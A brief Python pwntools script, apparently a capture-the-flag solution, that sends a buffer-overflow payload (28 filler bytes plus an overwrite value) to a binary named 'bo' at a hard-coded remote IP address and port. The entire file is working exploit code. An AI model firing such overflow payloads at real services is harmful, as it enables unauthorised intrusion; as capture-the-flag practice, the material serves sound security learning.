from pwn import *

elf = ELF("dist/bo")
if args.REMOTE:
    buf = b"\x41"*28
    buf += b"\x01\x00\x00"
    io = remote("35.187.242.102", 10001)
    io.send(buf)
    print(io.recvall())
else:
    io = elf.process()

io.interactive()